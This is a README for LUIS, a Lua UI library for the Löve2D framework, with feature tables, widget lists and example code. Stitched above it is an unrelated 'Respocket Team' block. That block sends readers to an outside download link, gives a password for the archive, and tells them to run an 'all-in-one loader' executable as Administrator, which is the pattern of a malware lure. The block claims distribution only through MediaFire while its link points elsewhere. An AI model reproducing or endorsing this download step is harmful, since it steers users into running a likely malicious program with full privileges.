<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# LUIS: Love UI System

<p align="center">
## Features

| Feature | Description |
|---------|-------------|
| Flexible Layout | Uses a grid-based system and FlexContainers for easy UI layout |
| Layer Management | Support for multiple UI layers with show/hide functionality & Z-indexing for element layering |
| Theme Support | Global theme customization, Per-widget theme overrides |
| Customizable Theming | Easily change the look and feel of your UI elements |
| Widget API | Core system for loading and managing widgets (widgets themselves are optional and loaded dynamically) |
| Event Handling | Built-in support for mouse, touch, keyboard, and gamepad interactions & focus management |
| Responsive Design | Automatically scales UI elements and interaction based on screen dimensions |
| State Management | Tracks and persists element states to save and load configurations |
| Extensibility | Modular design allowing easy addition of new widgets or removing unneeded widgets (see Widget Types section) |
| Debug Mode | Toggle grid and element outlines for easy development |

## Widget Types

LUIS comes with a variety of pre-built widgets to create rich user interfaces. While the following widgets are included, they are **completely optional** and are only loaded when you specify a widget folder during initialization. This modular approach allows you to use only the widgets you need or create your own custom widgets:

1. **Button**: Interactive clickable elements
2. **Slider**: Adjustable value selector
3. **Switch**: Toggle between two states
4. **CheckBox**: Select multiple options
5. **RadioButton**: Select one option from a group
6. **DropDown**: Select from a list of options
7. **TextInput**: User text entry field (single-line)
8. **TextInputMultiLine**: Multi-line text entry
9. **ProgressBar**: Display progress or loading status
10. **Label**: Display a text label
11. **Icon**: Display graphical icons
12. **ColorPicker**: Choose and Select a color
13. **Node**: A node to build an interactive NodeGraph
14. **DialogueWheel**: Circular interface that presents selectable options in a radial format
15. **Custom**: Add your own drawing function
16. **FlexContainer**: Special container for flexible layouts
17. **DialogueBox**: Animated dialogue box with a gradual text reveal effect

## Example

Here's a simple example to create a FlexContainer with two buttons and a slider (press 'TAB' for debug view):

main.lua
```lua
local initLuis = require("luis.init")

-- Direct this to your widgets folder.
local luis = initLuis("luis/widgets")

-- register flux in luis, some widgets need it for animations
luis.flux = require("luis.3rdparty.flux")

function love.load()
    -- Create a FlexContainer
    local container = luis.newFlexContainer(20, 20, 10, 10)

    -- Add some widgets to the container
    local button1 = luis.newButton("Button 1", 15, 3, function() print("Button 1 clicked!") end, function() print("Button 1 released!") end, 5, 2)
    local button2 = luis.newButton("Button 2", 15, 3, function() print("Button 2 clicked!") end, function() print("Button 2 released!") end, 5, 2)
    local slider = luis.newSlider(0, 100, 50, 10, 2, function(value)
        print('Slider value:', value)
    end, 10, 2)

    container:addChild(button1)
    container:addChild(button2)
    container:addChild(slider)

    luis.newLayer("main")
    luis.setCurrentLayer("main")
    
    -- Add the container to your LUIS layer
    luis.createElement(luis.currentLayer, "FlexContainer", container)

    love.window.setMode(1280, 1024)
end

local time = 0
function love.update(dt)
	time = time + dt
	if time >= 1/60 then	
		luis.flux.update(time)
		time = 0
	end

    luis.update(dt)
end

function love.draw()
    luis.draw()
end

function love.mousepressed(x, y, button, istouch)
    luis.mousepressed(x, y, button, istouch)
end

function love.mousereleased(x, y, button, istouch)
    luis.mousereleased(x, y, button, istouch)
end

function love.keypressed(key)
    if key == "escape" then
        if luis.currentLayer == "main" then
            love.event.quit()
        end
    elseif key == "tab" then -- Debug View
        luis.showGrid = not luis.showGrid
        luis.showLayerNames = not luis.showLayerNames
        luis.showElementOutlines = not luis.showElementOutlines
    else
        luis.keypressed(key)
    end
end
```

### FlexContainer

The FlexContainer is a powerful widget that allows for dynamic and responsive layouts:

- **Drag and Resize**: Containers can be moved and resized at runtime
- **Auto-arranging**: Child elements are automatically arranged within the container
- **Nested Containers**: Create complex layouts by nesting FlexContainers
- **Padding Control**: Adjust spacing between child elements

Example usage:

```lua
local container = luis.newFlexContainer(30, 30, 10, 10)
local button1 = luis.newButton("Button 1", 15, 3, function() print("Button 1 clicked!") end, function() print("Button 1 released!") end, 5, 2)
local button2 = luis.newButton("Button 2", 15, 3, function() print("Button 2 clicked!") end, function() print("Button 2 released!") end, 5, 2)

container:addChild(button1)
container:addChild(button2)

luis.createElement(luis.currentLayer, "FlexContainer", container)
```

## Custom Widgets

LUIS supports the creation of custom widgets to extend its functionality:

1. Create a new Lua file in the `luis/widgets` directory
2. Define your widget's properties and methods
3. Implement the required functions: `new()`, `update()`, `draw()`, and `click()`
4. Use the `setluis()` function to access the core LUIS library

Example of a custom widget:

```lua
local customWidget = {}

local luis
function customWidget.setluis(luisObj)
    luis = luisObj
end

function customWidget.new(width, height, row, col)
    local widget = {
        type = "CustomWidget",
        width = width * luis.gridSize,
        height = height * luis.gridSize,
        position = luis.Vector2D.new((col - 1) * luis.gridSize, (row - 1) * luis.gridSize),
        
        update = function(self, mx, my)
            -- Update logic here
        end,
        
        draw = function(self)
            -- Drawing logic here
        end,
        
        click = function(self, x, y)
            -- Click handling logic here
        end
    }
    return widget
end

return customWidget
```

## Widget Decorators

LUIS supports the Decorator pattern, allowing you to dynamically add visual effects and behaviors to widgets. Each widget includes built-in support for decorators that can modify their appearance without changing their core functionality.

Example usage:

```lua
-- Create a button with a glass morphism
local button = luis.newButton("Glassmorphism Button", 15, 3, onClick, onRelease, 5, 2)
button:setDecorator("GlassmorphismDecorator", {1, 0.5, 0, 0.5}, 15)  -- Glass morphism with size 15

-- Create a button with a glow effect
local button = luis.newButton("Glowing Button", 15, 3, onClick, onRelease, 5, 2)
button:setDecorator("GlowDecorator", {1, 0.5, 0, 0.5}, 15)  -- Orange glow with size 15

-- Create a button with a 9-slice border
local button2 = luis.newButton("Bordered Button", 15, 3, onClick, onRelease, 5, 2)
button2:setDecorator("Slice9Decorator", borderImage, 10, 10, 10, 10)  -- 10px borders
```

Available decorators:
- **GlassmorphismDecorator**: Implements a modern glassmorphism effect with customizable transparency, blur, borders, and shadows.
- **GlowDecorator**: Adds a customizable glow effect around the widget
- **Slice9Decorator**: Implements 9-slice scaling for bordered widgets

## Dependencies

- Löve2D: The game framework used for rendering and managing game objects.
## known Problems

- DropBox: Selection with the gamepad-analogstick works not for all choices
- FlexContainer - dropdown select is not possible via gamepad-analogstick
- TextInput - when changing Theme, we have to adjust the fontsize in TextInput widgets
- TextInputMultiLine not setConfig/getConfig

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## Author

Florian Fischer


---

MIT License with Additional Terms

Copyright (c) 2024 Florian Fischer

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

Additional Terms:

This software, or any derivative works thereof, may not be used, in whole or in part, for the purpose of training, fine-tuning, or improving machine learning models or artificial intelligence systems, including but not limited to large language models or neural networks.

By using this software, you agree to these additional terms.
